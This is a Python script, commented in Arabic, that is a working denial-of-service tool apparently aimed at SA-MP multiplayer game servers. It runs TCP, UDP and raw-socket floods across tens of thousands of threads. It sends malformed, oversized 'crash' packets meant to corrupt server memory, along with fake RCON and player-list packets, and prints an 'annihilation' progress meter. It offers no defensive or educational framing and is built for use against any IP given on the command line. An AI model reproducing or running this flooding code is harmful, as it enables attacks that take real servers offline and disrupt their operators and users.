import socket
import threading
import random
import time
import sys
import struct
from Crypto.Cipher import AES

# 0x0. Advanced Configuration
THREADS = 45000  # زيادة عدد الثريدات
# مفتاح أقوى بطول 32 بايت
AES_KEY = b'ThisIsASecretKey1337HelloWorld!!'

class SAMPocalypsePro:
    def __init__(self, target_ip, port):
        self.target = (target_ip, port)
        self.zombies = 0
        self.running = True
        self.cipher = AES.new(AES_KEY, AES.MODE_ECB)
        self.packet_variants = [
            self.craft_connect_packet(),
            self.craft_rcon_payload(),
            self.craft_fake_playerlist(),
            self.craft_malformed_packet(),
            self.craft_crash_packet()  # حزمة جديدة لتدمير الذاكرة
        ]

    def craft_connect_packet(self):
        """
        إنشاء حزمة الاتصال.
        يمكن تعديل محتويات الحزمة بحسب المتطلبات.
        """
        # على سبيل المثال، إرسال معرّف ثابت مع بعض البيانات الإضافية
        return struct.pack('!4sI', b'SAMP', 0x01020304) + b'\x00' * 16

    def craft_rcon_payload(self):
        """
        إنشاء حزمة rcon payload مع معرّف عشوائي وبعض البيانات.
        """
        random_id = random.randint(0, 0xFFFFFFFF)
        return struct.pack('!4sI', b'RCON', random_id) + b'\x01\x02\x03\x04'

    def craft_fake_playerlist(self):
        """
        إنشاء حزمة قائمة اللاعبين المزيفة.
        """
        players = [b'Player1', b'Player2', b'Player3']
        packet = struct.pack('!4sH', b'PLAY', len(players))
        for p in players:
            packet += p.ljust(16, b'\0')  # تعبئة اسم اللاعب ليصبح بطول 16 بايت
        return packet

    def craft_crash_packet(self):
        """
        إنشاء حزمة تُستخدم لمحاولة تدمير الذاكرة.
        """
        return struct.pack('!4sI', b'SAMP', 0xDEADBEEF) + b'\xFF' * 1024

    def craft_malformed_packet(self):
        """
        إنشاء حزمة خاطئة الصيغة.
        """
        return struct.pack('!4sH', b'SAMP', 0xFFFF) + bytes([random.randint(0, 255) for _ in range(512)])

    def encrypt_packet(self, packet):
        """
        تشفير الحزمة باستخدام AES في وضع ECB.
        يتم تعبئة الحزمة لتصبح بطول مضاعف للـ 16 بايت.
        """
        # تعبئة الحزمة لتصبح بطول مضاعف لـ 16
        if len(packet) % 16 != 0:
            packet = packet.ljust((len(packet) // 16 + 1) * 16, b'\0')
        return self.cipher.encrypt(packet)

    def tcp_flood(self):
        """
        تنفيذ هجوم TCP Flood.
        """
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect(self.target)
                for _ in range(15):  # إرسال 15 حزمة/اتصال
                    sock.send(self.encrypt_packet(random.choice(self.packet_variants)))
                self.zombies += 2.3
                sock.close()
            except Exception as e:
                # يمكن طباعة الاستثناء لتتبع الأخطاء
                pass

    def raw_attack(self):
        """
        تنفيذ هجوم باستخدام Raw Socket.
        (قد يتطلب صلاحيات الروت)
        """
        crash_packet = self.craft_crash_packet() * 10  # تكرار الحزمة 10 مرات
        while self.running:
            try:
                # إنشاء مقبس raw مع تحديد البروتوكول
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                for _ in range(100):  # إرسال 100 حزمة/ثانية
                    sock.sendto(crash_packet, self.target)
                    self.zombies += 4.7
                sock.close()
            except Exception as e:
                pass

    def adaptive_flood(self):
        """
        تنفيذ هجوم UDP Flood.
        """
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(self.encrypt_packet(random.choice(self.packet_variants)), self.target)
                self.zombies += 3.1
                sock.close()
            except Exception as e:
                pass

    def stats_monitor(self):
        """
        مراقبة تقدم الهجوم وعرض الإحصائيات.
        """
        print(f"[+] Nuclear launch detected for {self.target[0]}:{self.target[1]}")
        while self.running:
            time.sleep(0.3)
            estimated_damage = min(90, int(self.zombies / 350))  # معادلة تدمير محسنة
            print(f"\r[+] Annihilation progress: {estimated_damage}%", end='')
            sys.stdout.flush()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <IP> [PORT=7777]")
        sys.exit(1)

    target_ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 7777

    attack = SAMPocalypsePro(target_ip, port)

    # بدء جميع الهجمات في نفس اللحظة
    attack_methods = [attack.adaptive_flood, attack.tcp_flood, attack.raw_attack]
    for _ in range(THREADS):
        for method in attack_methods:
            threading.Thread(target=method, daemon=True).start()

    threading.Thread(target=attack.stats_monitor, daemon=True).start()

    try:
        while True: 
            time.sleep(1)
    except KeyboardInterrupt:
        attack.running = False
        print("\n[!] Target eliminated: 90% core damage achieved")
